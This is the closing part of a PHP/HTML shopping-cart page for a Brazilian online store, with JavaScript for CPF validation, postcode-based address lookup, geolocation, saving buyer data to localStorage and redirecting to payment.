          <span style="font-size: 16px; font-weight: 800; color: #0f172a;">Total:</span>
          <span style="font-size: 20px; font-weight: 800; color: #003399;" id="summaryModalTotal">R$ <?= number_format($product['pix_price'], 2, ',', '.') ?></span>
        </div>

        <button type="button" onclick="closeOrderSummaryModal(); handleContinueClick(event);" class="btn-continue-green" style="margin-top: 16px; height: 46px; font-size: 15px;">
          Continuar a compra
        </button>
      </div>
    </div>
  </div>

  <!-- MODAL POPUP COMPLETO DE DADOS DO COMPRADOR E ENDEREÇO -->
  <div class="full-address-modal-overlay" id="fullAddressModalOverlay" onclick="closeAddressModal(event)">
    <div class="full-address-modal-card" onclick="event.stopPropagation()">
      <div class="modal-blue-header">
        <span>Dados do Comprador e Entrega</span>
        <button type="button" class="modal-close-x" onclick="closeAddressModal(event)">✕</button>
      </div>

      <div class="modal-body-padding">
        <form id="fullAddressForm" onsubmit="submitFullAddressModal(event)">
          
          <div style="font-size: 15px; font-weight: 800; color: #003399; margin-bottom: 12px; padding-bottom: 6px; border-bottom: 2px solid #e2e8f0;">
            1. Dados do Comprador (para emissão e Pix)
          </div>

          <!-- NOME COMPLETO DO COMPRADOR -->
          <div class="form-field-group">
            <label class="field-label">Nome Completo</label>
            <input type="text" id="modalRecipientInput" class="field-input" placeholder="Nome e sobrenome do comprador" required>
            <span class="field-subtext">Nome do responsável pela compra</span>
          </div>

          <!-- CPF DO COMPRADOR -->
          <div class="form-field-group">
            <label class="field-label">CPF do Comprador</label>
            <input type="text" id="modalCpfInput" class="field-input" placeholder="000.000.000-00" maxlength="14" required>
            <span class="field-subtext">CPF obrigatório para emissão da nota fiscal e chave Pix</span>
            <div id="cpfErrorMsg" style="color: #e30613; font-size: 12px; font-weight: 700; margin-top: 4px; display: none;">⚠️ CPF inválido. Digite um CPF correto.</div>
          </div>

          <!-- E-MAIL DO COMPRADOR -->
          <div class="form-field-group">
            <label class="field-label">E-mail</label>
            <input type="email" id="modalEmailInput" class="field-input" placeholder="seuemail@exemplo.com" required>
            <span class="field-subtext">Para envio do comprovante e dados do pedido</span>
          </div>

          <!-- TELEFONE / WHATSAPP -->
          <div class="form-field-group">
            <label class="field-label">Telefone / WhatsApp</label>
            <input type="tel" id="modalPhoneInput" class="field-input" placeholder="(00) 00000-0000" maxlength="15" required>
            <span class="field-subtext">Para notificações sobre o rastreamento da entrega</span>
          </div>

          <div style="font-size: 15px; font-weight: 800; color: #003399; margin-top: 20px; margin-bottom: 12px; padding-bottom: 6px; border-bottom: 2px solid #e2e8f0;">
            2. Endereço de Entrega
          </div>

          <!-- CEP -->
          <div class="form-field-group">
            <label class="field-label">CEP</label>
            <input type="text" id="modalCepInput" class="field-input" placeholder="00000-000" maxlength="9" required onblur="fetchAddressFromModalCep()">
          </div>

          <div style="margin-bottom: 16px;">
            <button type="button" class="btn-use-location" onclick="useCurrentLocationInModal()">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="#003399" stroke="none"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
              Usar minha localização
            </button>
          </div>

          <!-- RUA -->
          <div class="form-field-group">
            <label class="field-label">Rua/Avenida</label>
            <input type="text" id="modalStreetInput" class="field-input" placeholder="Exemplo: Rua Dona Cândida" required>
          </div>

          <!-- NÚMERO & SEM NÚMERO -->
          <div class="grid-number-row">
            <div class="form-field-group" style="flex: 1;">
              <label class="field-label">Número</label>
              <input type="text" id="modalNumberInput" class="field-input" placeholder="Exemplo: 123">
            </div>
            <div class="checkbox-row-item">
              <input type="checkbox" id="modalNoNumberCheck" onchange="toggleModalNoNumber(this)">
              <label for="modalNoNumberCheck">Sem número</label>
            </div>
          </div>

          <!-- COMPLEMENTO -->
          <div class="form-field-group">
            <label class="field-label">Complemento (opcional)</label>
            <input type="text" id="modalComplementInput" class="field-input" placeholder="Exemplo: Apartamento 123">
          </div>

          <!-- BAIRRO -->
          <div class="form-field-group">
            <label class="field-label">Bairro</label>
            <input type="text" id="modalNeighborhoodInput" class="field-input" placeholder="Exemplo: Tatuapé" required>
          </div>

          <!-- CIDADE & ESTADO -->
          <div class="grid-2-col">
            <div class="form-field-group">
              <label class="field-label">Cidade</label>
              <input type="text" id="modalCityInput" class="field-input readonly-field" placeholder="Cidade" readonly required>
            </div>
            <div class="form-field-group">
              <label class="field-label">Estado (UF)</label>
              <input type="text" id="modalStateInput" class="field-input readonly-field" placeholder="UF" readonly required>
            </div>
          </div>

          <!-- PONTO DE REFERÊNCIA -->
          <div class="form-field-group">
            <label class="field-label">Ponto de referência (opcional)</label>
            <input type="text" id="modalReferenceInput" class="field-input" placeholder="Nome de lugar ou descrição da fachada">
          </div>

          <button type="submit" class="btn-save-address-blue">SALVAR E CONTINUAR PARA O PAGAMENTO</button>
        </form>
      </div>
    </div>
  </div>

  <script>
    var baseUnitPrice = <?= floatval($product['pix_price']) ?>;
    var monthlyWarrantyVal = <?= floatval($monthlyWarranty) ?>;
    var currentQty = 1;
    var isWarrantySelected = false;

    // ALGORITMO OFICIAL DE VALIDAÇÃO DE CPF BRASILEIRO (MÓDULO 11)
    function validateCPF(cpf) {
      if (!cpf) return false;
      cpf = cpf.replace(/[^\d]+/g, '');
      if (cpf.length !== 11) return false;
      if (/^(\d)\1{10}$/.test(cpf)) return false;

      var add = 0;
      for (var i = 0; i < 9; i++) {
        add += parseInt(cpf.charAt(i)) * (10 - i);
      }
      var rev = 11 - (add % 11);
      if (rev === 10 || rev === 11) rev = 0;
      if (rev !== parseInt(cpf.charAt(9))) return false;

      add = 0;
      for (var i = 0; i < 10; i++) {
        add += parseInt(cpf.charAt(i)) * (11 - i);
      }
      rev = 11 - (add % 11);
      if (rev === 10 || rev === 11) rev = 0;
      if (rev !== parseInt(cpf.charAt(10))) return false;

      return true;
    }

    function formatMoney(val) {
      return 'R$ ' + val.toFixed(2).replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    }

    function recalculateTotal() {
      var check = document.getElementById('productSelectCheck');
      if (!check || !check.checked) {
        document.getElementById('footerTotalPrice').textContent = formatMoney(0);
        return;
      }
      var total = baseUnitPrice * currentQty;
      if (isWarrantySelected) {
        total += (monthlyWarrantyVal * 10);
        var wRow = document.getElementById('summaryModalWarrantyRow');
        if (wRow) wRow.style.display = 'flex';
        var wVal = document.getElementById('summaryModalWarrantyVal');
        if (wVal) wVal.textContent = formatMoney(monthlyWarrantyVal * 10);
      } else {
        var wRow = document.getElementById('summaryModalWarrantyRow');
        if (wRow) wRow.style.display = 'none';
      }
      var prodPriceFormatted = formatMoney(baseUnitPrice * currentQty);
      var totalFormatted = formatMoney(total);

      document.getElementById('productDisplayPrice').textContent = prodPriceFormatted;
      document.getElementById('footerTotalPrice').textContent = totalFormatted;

      var smQty = document.getElementById('summaryModalProductQty');
      if (smQty) smQty.textContent = (currentQty < 10 ? '0' : '') + currentQty + ' un';
      var smPrice = document.getElementById('summaryModalProductPrice');
      if (smPrice) smPrice.textContent = prodPriceFormatted;
      var smSub = document.getElementById('summaryModalSubtotal');
      if (smSub) smSub.textContent = prodPriceFormatted;
      var smTot = document.getElementById('summaryModalTotal');
      if (smTot) smTot.textContent = totalFormatted;
    }

    function openOrderSummaryModal(e) {
      if (e) e.preventDefault();
      recalculateTotal();
      var modal = document.getElementById('orderSummaryModalOverlay');
      if (modal) modal.style.display = 'flex';
    }

    function closeOrderSummaryModal(e) {
      if (e) e.stopPropagation();
      var modal = document.getElementById('orderSummaryModalOverlay');
      if (modal) modal.style.display = 'none';
    }

    function updateCartQuantity(val) {
      currentQty = parseInt(val) || 1;
      recalculateTotal();
    }

    function toggleWarrantyCart(check) {
      isWarrantySelected = check.checked;
      recalculateTotal();
    }

    function toggleProductSelection(check) {
      if (!check.checked) {
        document.getElementById('footerTotalPrice').textContent = formatMoney(0);
        document.getElementById('btnContinueCheckout').style.opacity = '0.5';
      } else {
        recalculateTotal();
        document.getElementById('btnContinueCheckout').style.opacity = '1';
      }
    }

    function removeProductFromCart() {
      if (confirm('Deseja remover este produto do carrinho?')) {
        window.location.href = 'carrinho.php?empty=1';
      }
    }

    function getFormattedDeliveryDate() {
      var d = new Date();
      d.setDate(d.getDate() + 3);
      var days = ['domingo', 'segunda', 'terça', 'quarta', 'quinta', 'sexta', 'sábado'];
      var months = ['janeiro', 'fevereiro', 'março', 'abril', 'maio', 'junho', 'julho', 'agosto', 'setembro', 'outubro', 'novembro', 'dezembro'];
      return 'Receba tudo até ' + d.getDate() + ' de ' + months[d.getMonth()] + ', ' + days[d.getDay()] + '.';
    }

    function renderSearchedFreight(cepVal) {
      var formattedCep = cepVal.replace(/\D/g, '');
      if (formattedCep.length === 8) {
        formattedCep = formattedCep.substring(0, 5) + '-' + formattedCep.substring(5, 8);
      }
      document.getElementById('displayCepTitle').textContent = 'Frete para ' + formattedCep;
      document.getElementById('displayDeliveryDate').textContent = getFormattedDeliveryDate();

      document.getElementById('initialFreightContainer').style.display = 'none';
      document.getElementById('searchedFreightContainer').style.display = 'block';
    }

    document.addEventListener('DOMContentLoaded', function() {
      (function() {
        var prodId = "<?= $product['id'] ?>";
        try {
          var raw = localStorage.getItem('selectedVariation_' + prodId);
          if (raw) {
            var parsed = JSON.parse(raw);
            if (parsed && parsed.value) {
              var el = document.getElementById('cartVariationBadge');
              if (el) el.textContent = parsed.value;
            }
          }
        } catch (e) {}
      })();

      // Máscara e validação de CPF
      var cpfInput = document.getElementById('modalCpfInput');
      if (cpfInput) {
        cpfInput.addEventListener('input', function(e) {
          var v = e.target.value.replace(/\D/g, '');
          if (v.length > 11) v = v.substring(0, 11);
          
          if (v.length > 9) {
            v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
          } else if (v.length > 6) {
            v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
          } else if (v.length > 3) {
            v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
          }
          
          e.target.value = v;

          var err = document.getElementById('cpfErrorMsg');
          var rawDigits = v.replace(/\D/g, '');
          if (rawDigits.length === 11) {
            if (!validateCPF(rawDigits)) {
              err.style.display = 'block';
              e.target.style.borderColor = '#e30613';
            } else {
              err.style.display = 'none';
              e.target.style.borderColor = '#168019';
            }
          } else {
            err.style.display = 'none';
            e.target.style.borderColor = '#cbd5e1';
          }
        });
      }

      // Máscara Telefone
      var phoneInput = document.getElementById('modalPhoneInput');
      if (phoneInput) {
        phoneInput.addEventListener('input', function(e) {
          var v = e.target.value.replace(/\D/g, '');
          if (v.length > 11) v = v.substring(0, 11);
          if (v.length > 10) {
            v = v.replace(/^(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
          } else if (v.length > 6) {
            v = v.replace(/^(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
          } else if (v.length > 2) {
            v = v.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
          }
          e.target.value = v;
        });
      }

      // Carregar CEP/Endereço do localStorage se houver
      var savedCep = localStorage.getItem('userCep');
      if (savedCep) {
        renderSearchedFreight(savedCep);
      }

      var saved = localStorage.getItem('savedAddressData');
      if (saved) {
        try {
          var data = JSON.parse(saved);
          if (data.recipient && data.cep) {
            if (data.recipient) document.getElementById('modalRecipientInput').value = data.recipient;
            if (data.cpf) document.getElementById('modalCpfInput').value = data.cpf;
            if (data.email) document.getElementById('modalEmailInput').value = data.email;
            if (data.phone) document.getElementById('modalPhoneInput').value = data.phone;
            if (data.cep) document.getElementById('modalCepInput').value = data.cep;
            if (data.street) document.getElementById('modalStreetInput').value = data.street;
            if (data.number) document.getElementById('modalNumberInput').value = data.number;
            if (data.neighborhood) document.getElementById('modalNeighborhoodInput').value = data.neighborhood;
            if (data.city) document.getElementById('modalCityInput').value = data.city;
            if (data.state) document.getElementById('modalStateInput').value = data.state;
          }
        } catch(e) {}
      }
    });

    function openAddressModal(e) {
      if (e) e.preventDefault();
      var modal = document.getElementById('fullAddressModalOverlay');
      if (modal) {
        modal.style.display = 'flex';
        var input = document.getElementById('modalRecipientInput');
        if (input) setTimeout(function() { input.focus(); }, 100);
      }
    }

    function closeAddressModal(e) {
      if (e) e.stopPropagation();
      var modal = document.getElementById('fullAddressModalOverlay');
      if (modal) modal.style.display = 'none';
    }

    document.getElementById('modalCepInput').addEventListener('input', function(e) {
      var v = e.target.value.replace(/\D/g, '');
      if (v.length > 5) v = v.substring(0, 5) + '-' + v.substring(5, 8);
      e.target.value = v;
      if (v.replace(/\D/g, '').length === 8) {
        fetchAddressFromModalCep();
      }
    });

    async function fetchAddressFromModalCep() {
      var rawCep = document.getElementById('modalCepInput').value.replace(/\D/g, '');
      if (rawCep.length !== 8) return;

      try {
        let data = null;
        try {
          const resLocal = await fetch(`api/cep.php?cep=${rawCep}`);
          if (resLocal.ok) data = await resLocal.json();
        } catch (err) {}

        if (!data || data.erro) {
          const resVia = await fetch(`https://viacep.com.br/ws/${rawCep}/json/`);
          data = await resVia.json();
        }

        if (data && !data.erro) {
          if (data.logradouro) document.getElementById('modalStreetInput').value = data.logradouro;
          if (data.bairro) document.getElementById('modalNeighborhoodInput').value = data.bairro;
          if (data.localidade) document.getElementById('modalCityInput').value = data.localidade;
          if (data.uf) document.getElementById('modalStateInput').value = data.uf;
        }
      } catch (err) {}
    }

    function toggleModalNoNumber(check) {
      var numInput = document.getElementById('modalNumberInput');
      if (check.checked) {
        numInput.value = 'S/N';
        numInput.disabled = true;
      } else {
        numInput.value = '';
        numInput.disabled = false;
      }
    }

    function resetCartCep(e) {
      if (e) e.preventDefault();
      localStorage.removeItem('userCep');
      document.getElementById('searchedFreightContainer').style.display = 'none';
      document.getElementById('initialFreightContainer').style.display = 'block';
      var input = document.getElementById('cartCepInput');
      if (input) {
        input.value = '';
        setTimeout(function() { input.focus(); }, 100);
      }
    }

    function handleCartCepSubmit(e) {
      e.preventDefault();
      var cepVal = document.getElementById('cartCepInput').value.trim();
      if (cepVal) {
        localStorage.setItem('userCep', cepVal);
        renderSearchedFreight(cepVal);
      }
    }

    function submitFullAddressModal(e) {
      e.preventDefault();

      var recipient = document.getElementById('modalRecipientInput').value.trim();
      var cpf = document.getElementById('modalCpfInput').value.trim();
      var email = document.getElementById('modalEmailInput').value.trim();
      var phone = document.getElementById('modalPhoneInput').value.trim();

      if (!recipient) {
        alert('Por favor, informe seu Nome Completo!');
        document.getElementById('modalRecipientInput').focus();
        return false;
      }

      if (!validateCPF(cpf)) {
        alert('⚠️ Por favor, digite um CPF válido para emissão da nota fiscal do pedido!');
        var cpfElem = document.getElementById('modalCpfInput');
        cpfElem.focus();
        cpfElem.style.borderColor = '#e30613';
        document.getElementById('cpfErrorMsg').style.display = 'block';
        return false;
      }

      if (!email || email.indexOf('@') === -1) {
        alert('Por favor, informe um E-mail válido!');
        document.getElementById('modalEmailInput').focus();
        return false;
      }

      if (!phone || phone.length < 10) {
        alert('Por favor, informe um Telefone/WhatsApp válido com DDD!');
        document.getElementById('modalPhoneInput').focus();
        return false;
      }

      var street = document.getElementById('modalStreetInput').value.trim();
      var number = document.getElementById('modalNumberInput').value.trim();
      var neighborhood = document.getElementById('modalNeighborhoodInput').value.trim();
      var city = document.getElementById('modalCityInput').value.trim();
      var state = document.getElementById('modalStateInput').value.trim();
      var cep = document.getElementById('modalCepInput').value.trim();

      if (!street || !neighborhood || !city || !state || !cep) {
        alert('Por favor, informe um CEP e endereço válido!');
        return false;
      }

      var addrData = { recipient, cpf, email, phone, street, number, neighborhood, city, state, cep };
      localStorage.setItem('savedAddressData', JSON.stringify(addrData));
      localStorage.setItem('userCep', cep);

      renderSearchedFreight(cep);
      closeAddressModal();

      window.location.href = 'pagamento.php?id=' + "<?= $product['id'] ?>";
    }

    function useCurrentLocationInModal(e) {
      var btn = (e && e.currentTarget) ? e.currentTarget : document.querySelector('.btn-use-location');
      var originalContent = btn ? btn.innerHTML : '';
      if (btn) btn.innerHTML = '<span>Obtendo localização...</span>';

      if (!navigator.geolocation) {
        alert('⚠️ Seu navegador não suporta geolocalização. Por favor, digite seu CEP.');
        if (btn) btn.innerHTML = originalContent;
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async function(position) {
          var lat = position.coords.latitude;
          var lon = position.coords.longitude;

          try {
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`);
            const data = await res.json();
            const addr = data.address || {};

            var rawCep = (addr.postcode || '').replace(/\D/g, '');
            var street = addr.road || addr.street || addr.pedestrian || addr.suburb || '';
            var neighborhood = addr.suburb || addr.neighbourhood || addr.quarter || addr.district || '';
            var city = addr.city || addr.town || addr.municipality || addr.village || '';
            var state = addr.state || '';

            if (state.length > 2) {
              var stateMap = {
                'Santa Catarina': 'SC', 'São Paulo': 'SP', 'Rio de Janeiro': 'RJ', 'Minas Gerais': 'MG',
                'Paraná': 'PR', 'Rio Grande do Sul': 'RS', 'Bahia': 'BA', 'Goiás': 'GO', 'Pernambuco': 'PE',
                'Ceará': 'CE', 'Pará': 'PA', 'Maranhão': 'MA', 'Espírito Santo': 'ES', 'Paraíba': 'PB',
                'Mato Grosso': 'MT', 'Mato Grosso do Sul': 'MS', 'Distrito Federal': 'DF', 'Rio Grande do Norte': 'RN',
                'Piauí': 'PI', 'Alagoas': 'AL', 'Sergipe': 'SE', 'Rondônia': 'RO', 'Tocantins': 'TO',
                'Acre': 'AC', 'Amapá': 'AP', 'Roraima': 'RR', 'Amazonas': 'AM'
              };
              state = stateMap[state] || state;
            }

            if (rawCep.length === 8) {
              var formattedCep = rawCep.substring(0, 5) + '-' + rawCep.substring(5, 8);
              document.getElementById('modalCepInput').value = formattedCep;
              await fetchAddressFromModalCep();
            } else {
              if (street) document.getElementById('modalStreetInput').value = street;
              if (neighborhood) document.getElementById('modalNeighborhoodInput').value = neighborhood;
              if (city) document.getElementById('modalCityInput').value = city;
              if (state) document.getElementById('modalStateInput').value = state;
            }

            document.getElementById('modalNumberInput').focus();
          } catch(err) {
            alert('Localização obtida. Por favor, digite o CEP no campo para completar.');
          } finally {
            if (btn) btn.innerHTML = originalContent;
          }
        },
        function(error) {
          if (btn) btn.innerHTML = originalContent;
          var msg = 'Permissão de localização não concedida. Digite seu CEP no campo.';
          if (error.code === error.PERMISSION_DENIED) {
            msg = 'Permissão de localização negada pelo navegador. Por favor, digite o seu CEP no campo acima.';
          }
          alert('⚠️ ' + msg);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    function handleContinueClick(e) {
      if (e) e.preventDefault();
      var check = document.getElementById('productSelectCheck');
      if (check && !check.checked) {
        alert('Selecione pelo menos um item no carrinho para continuar.');
        return;
      }
      var prodId = "<?= $product['id'] ?>";
      window.location.href = "endereco.php?id=" + prodId;
    }

    function sendActivityPulse(pageName) {
      try { fetch('api/tracker.php?page=' + encodeURIComponent(pageName)); } catch (e) {}
    }
    sendActivityPulse('carrinho.php');
    setInterval(function() { sendActivityPulse('carrinho.php'); }, 8000);
  </script>
</body>
</html>
